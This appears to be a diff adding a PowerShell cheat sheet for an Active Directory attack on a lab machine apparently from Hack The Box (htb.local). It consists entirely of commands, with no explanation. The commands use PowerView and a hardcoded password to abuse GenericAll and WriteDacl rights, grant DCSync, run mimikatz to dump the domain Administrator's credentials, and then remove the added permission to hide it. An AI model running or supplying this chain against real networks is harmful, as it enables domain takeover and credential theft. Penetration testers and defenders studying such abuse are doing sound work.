@@ -1,0 +1,20 @@
+Import-Module .\PowerView.ps1
+
+
+GenericAll:
+$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
+Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'svc-alfresco' -Credential $Cred
+
+	check : Get-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS'
+
+
+
+WriteDacl:
+$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync -PrincipalIdentity svc-alfresco
+
+
+./mimikatz.exe “lsadump::dcsync /domain:htb.local /user:ADMINISTRATOR” "exit"
+Remove-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
